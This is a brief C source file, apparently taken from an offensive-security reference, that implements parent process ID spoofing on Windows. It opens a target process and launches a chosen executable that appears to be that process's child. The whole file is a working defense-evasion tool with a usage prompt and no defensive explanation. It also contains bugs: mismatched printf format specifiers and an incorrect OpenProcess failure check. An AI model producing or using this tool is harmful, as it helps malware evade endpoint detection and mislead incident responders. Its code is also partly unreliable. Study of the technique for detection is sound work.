// Reference: https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing

#include <Windows.h>

int main(int argc, char* argv[]){
    if(argc < 3){
        printf("Usage: %s <PID> <EXE>\n", argv[0]);
        return 1;
    }
    
    STARTUPINFOEXA startupInfo;
    PROCESS_INFORMATION procInfo;

    DWORD  targetPID;
    HANDLE parentProc;
    SIZE_T attributeSize;

    ZeroMemory(&startupInfo, sizeof(STARTUPINFOEXA));
    ZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));

    targetPID = atoi(argv[1]);
    if(targetPID == 0){
        printf("Failed to convert \"%s\" to DWORD\n", argv[1]);
        return 1;
    }

    parentProc = OpenProcess(MAXIMUM_ALLOWED, FALSE, targetPID);
    if(parentProc == INVALID_HANDLE_VALUE){
        printf("Failed to open a handle to PID %s\n", targetPID);
        return 1;
    }

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    startupInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, &attributeSize);

    UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProc, sizeof(HANDLE), NULL, NULL);
    startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    if(CreateProcessA(NULL, argv[2], NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &startupInfo.StartupInfo, &procInfo) != 0){
        return 0;
    } else {
        printf("Failed to open \"%s\" under PPID %s\n", argv[2], argv[1]);
        return 1;
    }
}